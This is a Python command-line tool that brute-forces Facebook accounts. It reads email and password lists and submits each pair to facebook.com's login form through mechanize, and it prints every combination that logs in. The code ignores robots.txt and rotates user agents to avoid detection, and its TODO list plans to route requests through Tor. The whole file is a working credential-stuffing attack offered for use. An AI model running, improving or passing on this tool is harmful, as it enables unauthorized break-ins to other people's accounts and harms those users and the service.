""" Bruteforce a speficic domain with an emails & passwords list.

TODO:
* Implement a way to query by Tor if it is installed and not already running.
* Verify if more precautions need to be taken.
* Update tqdm output to display current domain, password and email.
* Optimize querying, Probably do not need to load the login URL each time.
* Provide more user agents or dynamically generate one for each request.
* Implement parameter to redirect tqdm output (stdout, stderr, /dev/null).
"""

import random
import subprocess

from http.cookiejar import LWPCookieJar

import tqdm
import mechanize
import click

_MAX_TEXT_OUTPUT_WIDTH = 120

_USER_AGENTS = (
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
)

_SUPPORTED_DOMAINS = [
    "facebook",
]


class UnknownDomainName(Exception):
    def __init__(self, domain_name):
        Exception.__init__(self, "The domain name\"{domain_name}\" doesn't exists or is not supported".format(
            domain_name=domain_name
        ))


@click.command(context_settings=dict(max_content_width=_MAX_TEXT_OUTPUT_WIDTH))
@click.argument("domain", nargs=1, required=True,type=click.Choice(_SUPPORTED_DOMAINS))
@click.argument("file_emails", type=str, nargs=1, required=True)
@click.argument("file_passwords", type=str, nargs=1, required=True)
@click.option("--encoding-emails", type=str, default="utf8", show_default=True)
@click.option("--encoding-passwords", type=str, default="utf8", show_default=True)
@click.option("--newline-emails", type=str, default="\n", show_default=True)
@click.option("--newline-passwords", type=str, default="\n", show_default=True)
def main(domain, file_emails, file_passwords, encoding_emails, encoding_passwords, newline_emails, newline_passwords):
    # Setup browser
    browser = mechanize.Browser()
    browser.set_handle_robots(handle=False)  # Ignore robots.txt
    browser.set_handle_redirect(handle=True)  # Handle HTTP 30x redirections
    browser.set_cookiejar(cookiejar=LWPCookieJar())
    browser.set_handle_equiv(handle=True)  # Treats all http-equiv headers as HTTP headers
    browser.set_handle_referer(handle=True)  # Add Referer header to heack requests
    browser.set_handle_refresh(handle=mechanize._http.HTTPRefreshProcessor(), max_time=1)  # Handle HTTP Refresh headers

    # Find which domain to bruteforce
    login_function = domain_to_login_function(domain_name=domain)

    # Bruteforce file
    bruteforce_url(browser, login_function, file_emails, file_passwords, encoding_emails, encoding_passwords,
                   newline_emails, newline_passwords)


def domain_to_login_function(domain_name):
    domain_name = domain_name.lower()
    try:
        return globals()["login_" + domain_name]
    except KeyError:
        raise UnknownDomainName(domain_name)


def bruteforce_url(browser, login_function, file_emails, file_passwords, encoding_emails, encoding_passwords,
                   newline_emails, newline_passwords):
    with open(file_emails, 'r', encoding=encoding_emails, newline=newline_emails) as f_emails:
        for email in tqdm.tqdm(f_emails, total=file_length(file_emails)):
            email = email[:-1]
            bruteforce_url_with_emails_list(browser, login_function, email, file_passwords, encoding_passwords,
                                            newline_passwords, nb_of_passwords=file_length(file_passwords))


def bruteforce_url_with_emails_list(browser, login_function, email, file_passwords, encoding_passwords,
                                    newline_passwords, nb_of_passwords):
    with open(file_passwords, 'r', encoding=encoding_passwords, newline=newline_passwords) as f_passwords:
        for password in tqdm.tqdm(f_passwords, total=nb_of_passwords):
            password = password[:-1]
            if login_function(browser=browser, email=email, password=password):
                tqdm.tqdm.write("[+] Password found. Login : \"{login}\", Password : \"{password}\".".format(
                    login=email,
                    password=password
                ))


def login_facebook(browser, email, password):
    url = "https://www.facebook.com/login.php?login_attempt=1"

    browser.addheaders = [
        ('User-agent', random.choice(_USER_AGENTS))
    ]

    # Query the login url
    browser.open(url)

    # Look for the form
    browser.select_form(nr=0)
    browser.form['email'] = email
    browser.form['pass'] = password

    log = browser.submit().geturl()
    return (log != url) and ('login_attempt' not in log)


def file_length(file_path):
    out = subprocess.Popen(['wc', '-l', file_path],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT
                           ).communicate()[0]
    return int(out.partition(b' ')[0])


if __name__ == '__main__':
    main()
